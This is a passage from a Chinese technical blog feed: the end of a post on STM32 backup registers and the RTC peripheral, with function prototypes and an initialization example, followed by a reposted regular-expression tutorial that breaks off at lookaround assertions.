class="hljs-params">(FunctionalState NewState)</span>;<span class="hljs-comment">//中断配置</span><br><br><span class="hljs-comment">//下面这四个函数对应的就是BKP简介下图里的3 4 5 点</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BKP_RTCOutputConfig</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> BKP_RTCOutputSource)</span>;<span class="hljs-comment">//选择RTC引脚输出RTC校准时钟、RTC闹钟脉冲或者秒脉冲</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BKP_SetRTCCalibrationValue</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> CalibrationValue)</span>;<span class="hljs-comment">//设置 RTC 校准时钟</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BKP_WriteBackupRegister</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> BKP_DR, <span class="hljs-type">uint16_t</span> Data)</span>;<span class="hljs-comment">//将用户数据写入指定的数据备份寄存器。</span><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">BKP_ReadBackupRegister</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> BKP_DR)</span>;<span class="hljs-comment">//从指定的数据备份寄存器中读取数据</span><br><br><span class="hljs-comment">//状态、中断基本四兄弟</span><br>FlagStatus <span class="hljs-title function_">BKP_GetFlagStatus</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">BKP_ClearFlag</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br>ITStatus <span class="hljs-title function_">BKP_GetITStatus</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">BKP_ClearITPendingBit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><h1 id="RTC简介"><a href="#RTC简介" class="headerlink" title="RTC简介"></a>RTC简介</h1><p><strong>STM32的RTC外设（Real Time Clock），实质是一个掉电后还继续运行的定时器。</strong></p><p>从定时器的角度来说，相对于通用定时器TIM外设，它十分简单，只有很纯粹的计时和触发中断的功能；但从掉电还继续运行的角度来说，它却是STM32中唯一一个具有如此强大功能的外设。 <strong>所以RTC外设的复杂之处并不在于它的定时功能，而在于它掉电还继续运行的特性。</strong></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402120046589.png"></p><h1 id="RTC基本结构"><a href="#RTC基本结构" class="headerlink" title="RTC基本结构"></a>RTC基本结构</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402120032535.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402120046638.png"></p><p>上图中灰色的区域是备份区域，也就是说这个范围内的寄存器中的值可以被BKP所保存。</p><p><strong>余数寄存器是一个自减计数器</strong></p><p>可以看到这个图中只有一个32位的计数器，这是由于stm32使用的是前面记载的<strong>秒计数器</strong>来记录时间的。需要使用的时候通过C语言中的time.h中的函数来进行转换。<code>time()</code>函数在stm32中不可以使用，因为stm32是一个脱网的系统。</p><p>只有三个中断可以触发后面的控制寄存器，分别是：</p><ul><li>Second：秒中断</li><li>Overflow：溢出中断，由于stm32的计数器是一个无符号数，所以unix时间戳会在2^32次方-1秒后溢出，2106年。</li><li>Alarm：闹钟中断</li></ul><p>其中的定时器溢出事件无法被配置为中断。 若STM32原本处于待机状态，可由闹钟事件或WKUP事件(外部唤醒事件，属于EXTI模块，不属于RTC)使它退出待机模式。 闹钟事件是在计数器RTC_CNT的值等于闹钟寄存器RTC_ALR的值时触发的。</p><h2 id="时钟源的选择"><a href="#时钟源的选择" class="headerlink" title="时钟源的选择"></a>时钟源的选择</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402120033988.png"></p><p>根据RCC时钟树，可以看到RTC可以选择三种时钟源。一般我们都是使用<code>LSE OSC</code>这个时钟源，也就是<code>32.768khz</code>的这个。这个大小的时钟源一般都是用于RTC这个外设的。所以我们之后看到这个大小的时钟就应该要知道这很有可能是提供给RTC外设的。</p><p>但是这还不是最重要的，最重要的是只有中间这个时钟源才支持<code>VBAT</code>引脚，其他的两个都没有这个引脚可以使用，所以要达到要求只有使用中间这个时钟源。</p><h1 id="RTC相关函数"><a href="#RTC相关函数" class="headerlink" title="RTC相关函数"></a>RTC相关函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">RTC_ITConfig</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> RTC_IT, FunctionalState NewState)</span>;<span class="hljs-comment">//中断配置使能</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">RTC_EnterConfigMode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<span class="hljs-comment">//必须要先使用这个函数才可以更改RTC_PRL、RTC_CNT、RTC_ALR这三个寄存器。进入配置模式，这个函数一般不需要我们自己使用，而是Get__函数自己调用了。</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">RTC_ExitConfigMode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<span class="hljs-comment">//退出配置模式</span><br><span class="hljs-type">uint32_t</span>  <span class="hljs-title function_">RTC_GetCounter</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<span class="hljs-comment">//获取计数器的值</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">RTC_SetCounter</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> CounterValue)</span>;<span class="hljs-comment">//设置计数器的值，其实就是设置计数器的初始时间</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">RTC_SetPrescaler</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> PrescalerValue)</span>;<span class="hljs-comment">//设置预分频器</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">RTC_SetAlarm</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> AlarmValue)</span>;<span class="hljs-comment">//设置闹钟</span><br><span class="hljs-type">uint32_t</span>  <span class="hljs-title function_">RTC_GetDivider</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<span class="hljs-comment">//获取DIV余数寄存器中的值，这个函数的作用是为了获取比秒更加精细的时间，如ms、ns</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">RTC_WaitForLastTask</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<span class="hljs-comment">//等待上一次写入完成</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">RTC_WaitForSynchro</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<span class="hljs-comment">//等待同步</span><br><br><span class="hljs-comment">//状态、中断基本四兄弟</span><br>FlagStatus <span class="hljs-title function_">RTC_GetFlagStatus</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> RTC_FLAG)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">RTC_ClearFlag</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> RTC_FLAG)</span>;<br>ITStatus <span class="hljs-title function_">RTC_GetITStatus</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> RTC_IT)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">RTC_ClearITPendingBit</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> RTC_IT)</span>;<br></code></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>在每一次使用了更改RTC_PRL、RTC_CNT、RTC_ALR寄存器的值的函数时，必须要在后面调用函数<code>RTC_WaitForLastTask()</code></li><li>a</li></ol><p>实例：实际顺序就是根据上面的RTC基本结构的第一幅图来的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*开启时钟*/</span><br>RCC_APB1PeriphClockCmd(RCC_APB1Periph_PWR, ENABLE);<span class="hljs-comment">//开启PWR的时钟</span><br>RCC_APB1PeriphClockCmd(RCC_APB1Periph_BKP, ENABLE);<span class="hljs-comment">//开启BKP的时钟</span><br><br><span class="hljs-comment">/*备份寄存器访问使能*/</span><br>PWR_BackupAccessCmd(ENABLE);<span class="hljs-comment">//使用PWR开启对备份寄存器的访问</span><br><br><span class="hljs-keyword">if</span> (BKP_ReadBackupRegister(BKP_DR1) != <span class="hljs-number">0xA5A5</span>)<span class="hljs-comment">//通过写入备份寄存器的标志位，判断RTC是否是第一次配置</span><br><span class="hljs-comment">//if成立则执行第一次的RTC配置</span><br>&#123;<br>RCC_LSEConfig(RCC_LSE_ON);<span class="hljs-comment">//开启LSE时钟</span><br><span class="hljs-keyword">while</span> (RCC_GetFlagStatus(RCC_FLAG_LSERDY) != SET);<span class="hljs-comment">//等待LSE准备就绪</span><br><br>RCC_RTCCLKConfig(RCC_RTCCLKSource_LSE);<span class="hljs-comment">//选择RTCCLK来源为LSE</span><br>RCC_RTCCLKCmd(ENABLE);<span class="hljs-comment">//RTCCLK使能</span><br><br>RTC_WaitForSynchro();<span class="hljs-comment">//等待同步</span><br>RTC_WaitForLastTask();<span class="hljs-comment">//等待上一次操作完成</span><br><br>RTC_SetPrescaler(<span class="hljs-number">32768</span> - <span class="hljs-number">1</span>);<span class="hljs-comment">//设置RTC预分频器，预分频后的计数频率为1Hz</span><br>RTC_WaitForLastTask();<span class="hljs-comment">//等待上一次操作完成</span><br><br>MyRTC_SetTime();<span class="hljs-comment">//设置时间，调用此函数，全局数组里时间值刷新到RTC硬件电路</span><br><br>BKP_WriteBackupRegister(BKP_DR1, <span class="hljs-number">0xA5A5</span>);<span class="hljs-comment">//在备份寄存器写入自己规定的标志位，用于判断RTC是不是第一次执行配置</span><br>&#125;<br><span class="hljs-keyword">else</span><span class="hljs-comment">//RTC不是第一次配置</span><br>&#123;<br>RTC_WaitForSynchro();<span class="hljs-comment">//等待同步</span><br>RTC_WaitForLastTask();<span class="hljs-comment">//等待上一次操作完成</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式-转载</title>
    <link href="/2024/02/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E8%BD%AC%E8%BD%BD/"/>
    <url>/2024/02/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E8%BD%AC%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="什么是正则表达式？"><a href="#什么是正则表达式？" class="headerlink" title="什么是正则表达式？"></a>什么是正则表达式？</h2><blockquote><p>正则表达式是一组由字母和符号组成的特殊文本，它可以用来从文本中找出满足你想要的格式的句子。</p></blockquote><p>一个正则表达式是一种从左到右匹配主体字符串的模式。<br>“Regular expression”这个词比较拗口，我们常使用缩写的术语“regex”或“regexp”。<br>正则表达式可以从一个基础字符串中根据一定的匹配模式替换文本中的字符串、验证表单、提取字符串等等。</p><p>想象你正在写一个应用，然后你想设定一个用户命名的规则，让用户名包含字符、数字、下划线和连字符，以及限制字符的个数，好让名字看起来没那么丑。<br>我们使用以下正则表达式来验证一个用户名：</p><p><br/><br/></p><p>以上的正则表达式可以接受 <code>john_doe</code>、<code>jo-hn_doe</code>、<code>john12_as</code>。<br>但不匹配<code>Jo</code>，因为它包含了大写的字母而且太短了。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul><li><a href="#%E7%9B%AE%E5%BD%95">目录</a><ul><li><a href="#1-%E5%9F%BA%E6%9C%AC%E5%8C%B9%E9%85%8D">1. 基本匹配</a></li><li><a href="#2-%E5%85%83%E5%AD%97%E7%AC%A6">2. 元字符</a></li><li><a href="#21-%E7%82%B9%E8%BF%90%E7%AE%97%E7%AC%A6-">2.1 点运算符 <code>.</code></a></li><li><a href="#22-%E5%AD%97%E7%AC%A6%E9%9B%86">2.2 字符集</a><ul><li><a href="#221-%E5%90%A6%E5%AE%9A%E5%AD%97%E7%AC%A6%E9%9B%86">2.2.1 否定字符集</a></li></ul></li><li><a href="#23-%E9%87%8D%E5%A4%8D%E6%AC%A1%E6%95%B0">2.3 重复次数</a><ul><li><a href="#231--%E5%8F%B7">2.3.1 <code>*</code> 号</a></li><li><a href="#232--%E5%8F%B7">2.3.2 <code>+</code> 号</a></li><li><a href="#233--%E5%8F%B7">2.3.3 <code>?</code> 号</a></li></ul></li><li><a href="#24--%E5%8F%B7">2.4 <code>&#123;&#125;</code> 号</a></li><li><a href="#25--%E7%89%B9%E5%BE%81%E6%A0%87%E7%BE%A4">2.5 <code>(...)</code> 特征标群</a></li><li><a href="#26--%E6%88%96%E8%BF%90%E7%AE%97%E7%AC%A6">2.6 <code>|</code> 或运算符</a></li><li><a href="#27-%E8%BD%AC%E7%A0%81%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6">2.7 转码特殊字符</a></li><li><a href="#28-%E9%94%9A%E7%82%B9">2.8 锚点</a><ul><li><a href="#281--%E5%8F%B7">2.8.1 <code>^</code> 号</a></li><li><a href="#282--%E5%8F%B7">2.8.2 <code>$</code> 号</a></li></ul></li><li><a href="#3-%E7%AE%80%E5%86%99%E5%AD%97%E7%AC%A6%E9%9B%86">3. 简写字符集</a></li><li><a href="#4-%E9%9B%B6%E5%AE%BD%E5%BA%A6%E6%96%AD%E8%A8%80%E5%89%8D%E5%90%8E%E9%A2%84%E6%9F%A5">4. 零宽度断言（前后预查）</a><ul><li><a href="#41--%E6%AD%A3%E5%85%88%E8%A1%8C%E6%96%AD%E8%A8%80">4.1 <code>?=...</code> 正先行断言</a></li><li><a href="#42--%E8%B4%9F%E5%85%88%E8%A1%8C%E6%96%AD%E8%A8%80">4.2 <code>?!...</code> 负先行断言</a></li><li><a href="#43---%E6%AD%A3%E5%90%8E%E5%8F%91%E6%96%AD%E8%A8%80">4.3 <code>?&lt;= ...</code> 正后发断言</a></li><li><a href="#44--%E8%B4%9F%E5%90%8E%E5%8F%91%E6%96%AD%E8%A8%80">4.4 <code>?&lt;!...</code> 负后发断言</a></li></ul></li><li><a href="#5-%E6%A0%87%E5%BF%97">5. 标志</a><ul><li><a href="#51-%E5%BF%BD%E7%95%A5%E5%A4%A7%E5%B0%8F%E5%86%99-case-insensitive">5.1 忽略大小写 (Case Insensitive)</a></li><li><a href="#52-%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2-global-search">5.2 全局搜索 (Global search)</a></li><li><a href="#53-%E5%A4%9A%E8%A1%8C%E4%BF%AE%E9%A5%B0%E7%AC%A6-multiline">5.3 多行修饰符 (Multiline)</a></li><li><a href="#6-%E8%B4%AA%E5%A9%AA%E5%8C%B9%E9%85%8D%E4%B8%8E%E6%83%B0%E6%80%A7%E5%8C%B9%E9%85%8D-greedy-vs-lazy-matching">6. 贪婪匹配与惰性匹配 (Greedy vs lazy matching)</a></li></ul></li></ul></li></ul><h2 id="1-基本匹配"><a href="#1-基本匹配" class="headerlink" title="1. 基本匹配"></a>1. 基本匹配</h2><p>正则表达式其实就是在执行搜索时的格式，它由一些字母和数字组合而成。<br>例如：一个正则表达式 <code>the</code>，它表示一个规则：由字母<code>t</code>开始，接着是<code>h</code>，再接着是<code>e</code>。</p><pre>"the" => The fat cat sat on <a href="#learn-regex"><strong>the</strong></a> mat.</pre><p><a href="https://regex101.com/r/dmRygT/1">在线练习</a></p><p>正则表达式<code>123</code>匹配字符串<code>123</code>。它逐个字符的与输入的正则表达式做比较。</p><p>正则表达式是大小写敏感的，所以<code>The</code>不会匹配<code>the</code>。</p><pre>"The" => <a href="#learn-regex"><strong>The</strong></a> fat cat sat on the mat.</pre><p><a href="https://regex101.com/r/1paXsy/1">在线练习</a></p><h2 id="2-元字符"><a href="#2-元字符" class="headerlink" title="2. 元字符"></a>2. 元字符</h2><p>正则表达式主要依赖于元字符。<br>元字符不代表他们本身的字面意思，他们都有特殊的含义。一些元字符写在方括号中的时候有一些特殊的意思。以下是一些元字符的介绍：</p><table><thead><tr><th align="center">元字符</th><th>描述</th></tr></thead><tbody><tr><td align="center">.</td><td>句号匹配任意单个字符除了换行符。</td></tr><tr><td align="center">[ ]</td><td>字符种类。匹配方括号内的任意字符。</td></tr><tr><td align="center">[^ ]</td><td>否定的字符种类。匹配除了方括号里的任意字符</td></tr><tr><td align="center">*</td><td>匹配&gt;&#x3D;0个重复的在*号之前的字符。</td></tr><tr><td align="center">+</td><td>匹配&gt;&#x3D;1个重复的+号前的字符。</td></tr><tr><td align="center">?</td><td>标记?之前的字符为可选.</td></tr><tr><td align="center">{n,m}</td><td>匹配num个大括号之前的字符或字符集 (n &lt;&#x3D; num &lt;&#x3D; m).</td></tr><tr><td align="center">(xyz)</td><td>字符集，匹配与 xyz 完全相等的字符串.</td></tr><tr><td align="center">&#124;</td><td>或运算符，匹配符号前或后的字符.</td></tr><tr><td align="center">&#92;</td><td>转义字符,用于匹配一些保留的字符 <code>[ ] ( ) &#123; &#125; . * + ? ^ $ \ &#124;</code></td></tr><tr><td align="center">^</td><td>从开始行开始匹配.</td></tr><tr><td align="center">$</td><td>从末端开始匹配.</td></tr></tbody></table><h2 id="2-1-点运算符"><a href="#2-1-点运算符" class="headerlink" title="2.1 点运算符 ."></a>2.1 点运算符 <code>.</code></h2><p><code>.</code>是元字符中最简单的例子。<br><code>.</code>匹配任意单个字符，但不匹配换行符。<br>例如，表达式<code>.ar</code>匹配一个任意字符后面跟着是<code>a</code>和<code>r</code>的字符串。</p><pre>".ar" => The <a href="#learn-regex"><strong>car</strong></a> <a href="#learn-regex"><strong>par</strong></a>ked in the <a href="#learn-regex"><strong>gar</strong></a>age.</pre><p><a href="https://regex101.com/r/xc9GkU/1">在线练习</a></p><h2 id="2-2-字符集"><a href="#2-2-字符集" class="headerlink" title="2.2 字符集"></a>2.2 字符集</h2><p>字符集也叫做字符类。<br>方括号用来指定一个字符集。<br>在方括号中使用连字符来指定字符集的范围。<br>在方括号中的字符集不关心顺序。<br>例如，表达式<code>[Tt]he</code> 匹配 <code>the</code> 和 <code>The</code>。</p><pre>"[Tt]he" => <a href="#learn-regex"><strong>The</strong></a> car parked in <a href="#learn-regex"><strong>the</strong></a> garage.</pre><p><a href="https://regex101.com/r/2ITLQ4/1">在线练习</a></p><p>方括号的句号就表示句号。<br>表达式 <code>ar[.]</code> 匹配 <code>ar.</code>字符串</p><pre>"ar[.]" => A garage is a good place to park a c<a href="#learn-regex"><strong>ar.</strong></a></pre><p><a href="https://regex101.com/r/wL3xtE/1">在线练习</a></p><h3 id="2-2-1-否定字符集"><a href="#2-2-1-否定字符集" class="headerlink" title="2.2.1 否定字符集"></a>2.2.1 否定字符集</h3><p>一般来说 <code>^</code> 表示一个字符串的开头，但它用在一个方括号的开头的时候，它表示这个字符集是否定的。<br>例如，表达式<code>[^c]ar</code> 匹配一个后面跟着<code>ar</code>的除了<code>c</code>的任意字符。</p><pre>"[^c]ar" => The car <a href="#learn-regex"><strong>par</strong></a>ked in the <a href="#learn-regex"><strong>gar</strong></a>age.</pre><p><a href="https://regex101.com/r/nNNlq3/1">在线练习</a></p><h2 id="2-3-重复次数"><a href="#2-3-重复次数" class="headerlink" title="2.3 重复次数"></a>2.3 重复次数</h2><p>后面跟着元字符 <code>+</code>，<code>*</code> or <code>?</code> 的，用来指定匹配子模式的次数。<br>这些元字符在不同的情况下有着不同的意思。</p><h3 id="2-3-1-号"><a href="#2-3-1-号" class="headerlink" title="2.3.1 * 号"></a>2.3.1 <code>*</code> 号</h3><p><code>*</code>号匹配 在<code>*</code>之前的字符出现<code>大于等于0</code>次。<br>例如，表达式 <code>a*</code> 匹配0或更多个以a开头的字符。表达式<code>[a-z]*</code> 匹配一个行中所有以小写字母开头的字符串。</p><pre>"[a-z]*" => T<a href="#learn-regex"><strong>he</strong></a> <a href="#learn-regex"><strong>car</strong></a> <a href="#learn-regex"><strong>parked</strong></a> <a href="#learn-regex"><strong>in</strong></a> <a href="#learn-regex"><strong>the</strong></a> <a href="#learn-regex"><strong>garage</strong></a> #21.</pre><p><a href="https://regex101.com/r/7m8me5/1">在线练习</a></p><p><code>*</code>字符和<code>.</code>字符搭配可以匹配所有的字符<code>.*</code>。<br><code>*</code>和表示匹配空格的符号<code>\s</code>连起来用，如表达式<code>\s*cat\s*</code>匹配0或更多个空格开头和0或更多个空格结尾的cat字符串。</p><pre>"\s*cat\s*" => The fat<a href="#learn-regex"><strong> cat </strong></a>sat on the con<a href="#learn-regex"><strong>cat</strong></a>enation.</pre><p><a href="https://regex101.com/r/gGrwuz/1">在线练习</a></p><h3 id="2-3-2-号"><a href="#2-3-2-号" class="headerlink" title="2.3.2 + 号"></a>2.3.2 <code>+</code> 号</h3><p><code>+</code>号匹配<code>+</code>号之前的字符出现 &gt;&#x3D;1 次。<br>例如表达式<code>c.+t</code> 匹配以首字母<code>c</code>开头以<code>t</code>结尾，中间跟着至少一个字符的字符串。</p><pre>"c.+t" => The fat <a href="#learn-regex"><strong>cat sat on the mat</strong></a>.</pre><p><a href="https://regex101.com/r/Dzf9Aa/1">在线练习</a></p><h3 id="2-3-3-号"><a href="#2-3-3-号" class="headerlink" title="2.3.3 ? 号"></a>2.3.3 <code>?</code> 号</h3><p>在正则表达式中元字符 <code>?</code> 标记在符号前面的字符为可选，即出现 0 或 1 次。<br>例如，表达式 <code>[T]?he</code> 匹配字符串 <code>he</code> 和 <code>The</code>。</p><pre>"[T]he" => <a href="#learn-regex"><strong>The</strong></a> car is parked in the garage.</pre><p><a href="https://regex101.com/r/cIg9zm/1">在线练习</a></p><pre>"[T]?he" => <a href="#learn-regex"><strong>The</strong></a> car is parked in t<a href="#learn-regex"><strong>he</strong></a> garage.</pre><p><a href="https://regex101.com/r/kPpO2x/1">在线练习</a></p><h2 id="2-4-号"><a href="#2-4-号" class="headerlink" title="2.4 {} 号"></a>2.4 <code>&#123;&#125;</code> 号</h2><p>在正则表达式中 <code>&#123;&#125;</code> 是一个量词，常用来限定一个或一组字符可以重复出现的次数。<br>例如， 表达式 <code>[0-9]&#123;2,3&#125;</code> 匹配最少 2 位最多 3 位 0~9 的数字。</p><pre>"[0-9]{2,3}" => The number was 9.<a href="#learn-regex"><strong>999</strong></a>7 but we rounded it off to <a href="#learn-regex"><strong>10</strong></a>.0.</pre><p><a href="https://regex101.com/r/juM86s/1">在线练习</a></p><p>我们可以省略第二个参数。<br>例如，<code>[0-9]&#123;2,&#125;</code> 匹配至少两位 0~9 的数字。</p><pre>"[0-9]{2,}" => The number was 9.<a href="#learn-regex"><strong>9997</strong></a> but we rounded it off to <a href="#learn-regex"><strong>10</strong></a>.0.</pre><p><a href="https://regex101.com/r/Gdy4w5/1">在线练习</a></p><p>如果逗号也省略掉则表示重复固定的次数。<br>例如，<code>[0-9]&#123;3&#125;</code> 匹配3位数字</p><pre>"[0-9]{3}" => The number was 9.<a href="#learn-regex"><strong>999</strong></a>7 but we rounded it off to 10.0.</pre><p><a href="https://regex101.com/r/Sivu30/1">在线练习</a></p><h2 id="2-5-特征标群"><a href="#2-5-特征标群" class="headerlink" title="2.5 (...) 特征标群"></a>2.5 <code>(...)</code> 特征标群</h2><p>特征标群是一组写在 <code>(...)</code> 中的子模式。<code>(...)</code> 中包含的内容将会被看成一个整体，和数学中小括号（ ）的作用相同。例如, 表达式 <code>(ab)*</code> 匹配连续出现 0 或更多个 <code>ab</code>。如果没有使用 <code>(...)</code> ，那么表达式 <code>ab*</code> 将匹配连续出现 0 或更多个 <code>b</code> 。再比如之前说的 <code>&#123;&#125;</code> 是用来表示前面一个字符出现指定次数。但如果在 <code>&#123;&#125;</code> 前加上特征标群 <code>(...)</code> 则表示整个标群内的字符重复 N 次。</p><p>我们还可以在 <code>()</code> 中用或字符 <code>|</code> 表示或。例如，<code>(c|g|p)ar</code> 匹配 <code>car</code> 或 <code>gar</code> 或 <code>par</code>.</p><pre>"(c|g|p)ar" => The <a href="#learn-regex"><strong>car</strong></a> is <a href="#learn-regex"><strong>par</strong></a>ked in the <a href="#learn-regex"><strong>gar</strong></a>age.</pre><p><a href="https://regex101.com/r/tUxrBG/1">在线练习</a></p><h2 id="2-6-或运算符"><a href="#2-6-或运算符" class="headerlink" title="2.6 | 或运算符"></a>2.6 <code>|</code> 或运算符</h2><p>或运算符就表示或，用作判断条件。</p><p>例如 <code>(T|t)he|car</code> 匹配 <code>(T|t)he</code> 或 <code>car</code>。</p><pre>"(T|t)he|car" => <a href="#learn-regex"><strong>The</strong></a> <a href="#learn-regex"><strong>car</strong></a> is parked in <a href="#learn-regex"><strong>the</strong></a> garage.</pre><p><a href="https://regex101.com/r/fBXyX0/1">在线练习</a></p><h2 id="2-7-转码特殊字符"><a href="#2-7-转码特殊字符" class="headerlink" title="2.7 转码特殊字符"></a>2.7 转码特殊字符</h2><p>反斜线 <code>\</code> 在表达式中用于转码紧跟其后的字符。用于指定 <code>&#123; &#125; [ ] / \ + * . $ ^ | ?</code> 这些特殊字符。如果想要匹配这些特殊字符则要在其前面加上反斜线 <code>\</code>。</p><p>例如 <code>.</code> 是用来匹配除换行符外的所有字符的。如果想要匹配句子中的 <code>.</code> 则要写成 <code>\.</code> 以下这个例子 <code>\.?</code>是选择性匹配<code>.</code></p><pre>"(f|c|m)at\.?" => The <a href="#learn-regex"><strong>fat</strong></a> <a href="#learn-regex"><strong>cat</strong></a> sat on the <a href="#learn-regex"><strong>mat.</strong></a></pre><p><a href="https://regex101.com/r/DOc5Nu/1">在线练习</a></p><h2 id="2-8-锚点"><a href="#2-8-锚点" class="headerlink" title="2.8 锚点"></a>2.8 锚点</h2><p>在正则表达式中，想要匹配指定开头或结尾的字符串就要使用到锚点。<code>^</code> 指定开头，<code>$</code> 指定结尾。</p><h3 id="2-8-1-号"><a href="#2-8-1-号" class="headerlink" title="2.8.1 ^ 号"></a>2.8.1 <code>^</code> 号</h3><p><code>^</code> 用来检查匹配的字符串是否在所匹配字符串的开头。</p><p>例如，在 <code>abc</code> 中使用表达式 <code>^a</code> 会得到结果 <code>a</code>。但如果使用 <code>^b</code> 将匹配不到任何结果。因为在字符串 <code>abc</code> 中并不是以 <code>b</code> 开头。</p><p>例如，<code>^(T|t)he</code> 匹配以 <code>The</code> 或 <code>the</code> 开头的字符串。</p><pre>"(T|t)he" => <a href="#learn-regex"><strong>The</strong></a> car is parked in <a href="#learn-regex"><strong>the</strong></a> garage.</pre><p><a href="https://regex101.com/r/5ljjgB/1">在线练习</a></p><pre>"^(T|t)he" => <a href="#learn-regex"><strong>The</strong></a> car is parked in the garage.</pre><p><a href="https://regex101.com/r/jXrKne/1">在线练习</a></p><h3 id="2-8-2-号"><a href="#2-8-2-号" class="headerlink" title="2.8.2 $ 号"></a>2.8.2 <code>$</code> 号</h3><p>同理于 <code>^</code> 号，<code>$</code> 号用来匹配字符是否是最后一个。</p><p>例如，<code>(at\.)$</code> 匹配以 <code>at.</code> 结尾的字符串。</p><pre>"(at\.)" => The fat c<a href="#learn-regex"><strong>at.</strong></a> s<a href="#learn-regex"><strong>at.</strong></a> on the m<a href="#learn-regex"><strong>at.</strong></a></pre><p><a href="https://regex101.com/r/y4Au4D/1">在线练习</a></p><pre>"(at\.)$" => The fat cat. sat. on the m<a href="#learn-regex"><strong>at.</strong></a></pre><p><a href="https://regex101.com/r/t0AkOd/1">在线练习</a></p><h2 id="3-简写字符集"><a href="#3-简写字符集" class="headerlink" title="3. 简写字符集"></a>3. 简写字符集</h2><p>正则表达式提供一些常用的字符集简写。如下:</p><table><thead><tr><th align="center">简写</th><th>描述</th></tr></thead><tbody><tr><td align="center">.</td><td>除换行符外的所有字符</td></tr><tr><td align="center">\w</td><td>匹配所有字母数字，等同于 <code>[a-zA-Z0-9_]</code></td></tr><tr><td align="center">\W</td><td>匹配所有非字母数字，即符号，等同于： <code>[^\w]</code></td></tr><tr><td align="center">\d</td><td>匹配数字： <code>[0-9]</code></td></tr><tr><td align="center">\D</td><td>匹配非数字： <code>[^\d]</code></td></tr><tr><td align="center">\s</td><td>匹配所有空格字符，等同于： <code>[\t\n\f\r\p&#123;Z&#125;]</code></td></tr><tr><td align="center">\S</td><td>匹配所有非空格字符： <code>[^\s]</code></td></tr><tr><td align="center">\f</td><td>匹配一个换页符</td></tr><tr><td align="center">\n</td><td>匹配一个换行符</td></tr><tr><td align="center">\r</td><td>匹配一个回车符</td></tr><tr><td align="center">\t</td><td>匹配一个制表符</td></tr><tr><td align="center">\v</td><td>匹配一个垂直制表符</td></tr><tr><td align="center">\p</td><td>匹配 CR&#x2F;LF（等同于 <code>\r\n</code>），用来匹配 DOS 行终止符</td></tr></tbody></table><h2 id="4-零宽度断言（前后预查）"><a href="#4-零宽度断言（前后预查）" class="headerlink" title="4. 